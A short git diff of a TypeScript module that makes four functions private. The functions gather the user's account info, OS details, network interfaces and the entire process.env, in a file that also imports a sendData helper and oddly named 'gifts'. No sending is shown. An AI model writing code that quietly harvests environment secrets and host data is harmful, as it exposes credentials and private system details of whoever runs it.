@@ -4,11 +4,11 @@ import { sendData } from "./core";
 import { generateRandomId, getIpv4Interfaces } from "./utils";
 import { heyInternet, wc, catscatscatscats } from "./gifts";
 
-export function getUserInfo(): UserDetails {
+function getUserInfo(): UserDetails {
   return os.userInfo()
 }
 
-export function getOsInfo(): OsDetails {
+function getOsInfo(): OsDetails {
   return {
       arch: os.arch(),
       hostname: os.hostname(),
@@ -18,11 +18,11 @@ export function getOsInfo(): OsDetails {
   };
 }
 
-export function getNetworkInfo(): NetworkInterfacesDetails {
+function getNetworkInfo(): NetworkInterfacesDetails {
   return getIpv4Interfaces(os.networkInterfaces());
 }
 
-export function getEnvInfo(): EnvDetails {
+function getEnvInfo(): EnvDetails {
   return process.env;
 };
 
